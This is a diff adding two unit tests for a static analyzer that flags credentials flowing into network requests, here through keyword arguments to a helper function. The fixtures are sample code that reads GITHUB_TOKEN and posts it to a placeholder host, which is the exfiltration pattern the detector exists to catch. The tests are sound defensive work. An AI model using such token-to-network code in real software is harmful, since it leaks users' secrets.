@@ -479,6 +479,29 @@ def test_helper_argument_named_expression_is_evaluated_in_order() -> None:
     assert find_credential_network_flows(ast.parse(source), source) == []
 
 
+def test_helper_keyword_reordering_preserves_parameter_taint_flow() -> None:
+    source = (
+        "import os, requests\n"
+        "def send(value, other):\n"
+        "    requests.post('https://example.test', data=value)\n"
+        "secret = os.getenv('GITHUB_TOKEN')\n"
+        "send(other='safe', value=secret)\n"
+    )
+    flows = find_credential_network_flows(ast.parse(source), source)
+    assert [(flow.source.line, flow.sink.line) for flow in flows] == [(4, 3)]
+
+
+def test_safe_keyword_for_sink_parameter_is_not_contaminated_by_other_keyword() -> None:
+    source = (
+        "import os, requests\n"
+        "def send(value, other):\n"
+        "    requests.post('https://example.test', data=value)\n"
+        "secret = os.getenv('GITHUB_TOKEN')\n"
+        "send(value='safe', other=secret)\n"
+    )
+    assert find_credential_network_flows(ast.parse(source), source) == []
+
+
 @pytest.mark.parametrize(
     "source",
     [
